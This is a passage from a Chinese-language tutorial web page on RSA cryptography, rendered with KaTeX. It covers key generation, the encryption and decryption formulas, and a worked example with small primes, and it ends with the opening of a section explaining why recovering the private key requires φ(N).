<li>将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 的记录销毁</li>
</ol>
<p>此时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(N,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span> 是公钥，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(N,d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span> 是私钥，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><mi>e</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(N,e,d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span>是密钥对。</p>
<p>[^rsa  公钥与私钥的产生-2]: 根据前置数学知识的欧拉函数[4]可知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)=\varphi (p)\varphi (q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>​，由[2]可知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (p)\varphi (q)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>​</p>
<p>产生的公钥和私钥均可用于加解密操作，用公钥加密的数据只能由对应的私钥解密，反之亦然。一般常用于以下两种途径：</p>
<ul>
<li>私钥用于签名，公钥用于验签。</li>
<li>公钥用于加密、私钥用于解密。</li>
</ul>
<h4 id="消息加密">消息加密<a class="header-anchor" href="#消息加密"> ¶ </a></h4>
<p>首先需要将消息 以一个双方约定好的格式转化为一个小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>，且与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 互质的整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><mi>c</mi><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>N</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">m^{e}\equiv c\pmod N
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p>
<h4 id="消息解密">消息解密<a class="header-anchor" href="#消息解密"> ¶ </a></h4>
<p>利用密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 进行解密。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mi>m</mi><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>N</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">c^{d}\equiv m\pmod N
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p>
<h3 id="举例">举例<a class="header-anchor" href="#举例"> ¶ </a></h3>
<h4 id="私钥公钥的产生">私钥公钥的产生<a class="header-anchor" href="#私钥公钥的产生"> ¶ </a></h4>
<ol>
<li>
<p>选择两个质数：选择<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>61</mn></mrow><annotation encoding="application/x-tex">61</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">61</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>53</mn></mrow><annotation encoding="application/x-tex">53</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">53</span></span></span></span></p>
</li>
<li>
<p>计算pq的乘积n：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>61</mn><mo>×</mo><mn>53</mn><mo>=</mo><mn>3233</mn></mrow><annotation encoding="application/x-tex">n = 61\times 53 = 3233</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">61</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">53</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3233</span></span></span></span>；n的长度就是密钥长度。3233写成二进制是<code>110010100001</code>，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p>
</li>
<li>
<p>计算n的欧拉函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>3233</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>61</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mn>53</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>60</mn><mo>×</mo><mn>52</mn><mo>=</mo><mn>3120</mn></mrow><annotation encoding="application/x-tex">\varphi (3233) = (61-1)\times(53-1) = 60\times52 = 3120</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">3233</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">61</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">53</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">60</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">52</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3120</span></span></span></span></p>
</li>
<li>
<p>选取整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>，选择为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>17</mn></mrow><annotation encoding="application/x-tex">17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">17</span></span></span></span></p>
</li>
<li>
<p>计算e对于  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的模反元素d</p>
<p>也就是使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">ed \equiv 1\pmod {\varphi(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span>成立，等价于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed-1 = k\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p>
<p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>17</mn></mrow><annotation encoding="application/x-tex">e=17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">17</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>3120</mn></mrow><annotation encoding="application/x-tex">\varphi(n)=3120</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3120</span></span></span></span>，也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>17</mn><mi>d</mi><mo>+</mo><mn>3120</mn><mi>k</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">17d+3120k = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">17</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">3120</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>成立，通过<em>拓展欧几里得算法</em>求得一组解为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>2753</mn><mo separator="true">,</mo><mo>−</mo><mn>15</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(d,k) = (2753,-15)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2753</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">15</span><span class="mclose">)</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><mn>2753</mn></mrow><annotation encoding="application/x-tex">d=2753</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2753</span></span></span></span></p>
</li>
<li>
<p>封装公钥和私钥</p>
<p>公钥为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>3233</mn><mo separator="true">,</mo><mn>17</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n,e) = (3233, 17)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3233</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">17</span><span class="mclose">)</span></span></span></span>；私钥为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>3233</mn><mo separator="true">,</mo><mn>2753</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n,d) = (3233, 2753)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3233</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2753</span><span class="mclose">)</span></span></span></span></p>
</li>
</ol>
<h4 id="破解">破解<a class="header-anchor" href="#破解"> ¶ </a></h4>
<p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>，推导出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></p>
<ol>
<li>根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">ed\equiv 1 \pmod {\varphi (N)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">))</span></span></span></span>：只有知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>和$ \varphi (N) <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，才能算出</mtext></mrow><annotation encoding="application/x-tex">，才能算出</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">，才能算出</span></span></span></span>d$</li>
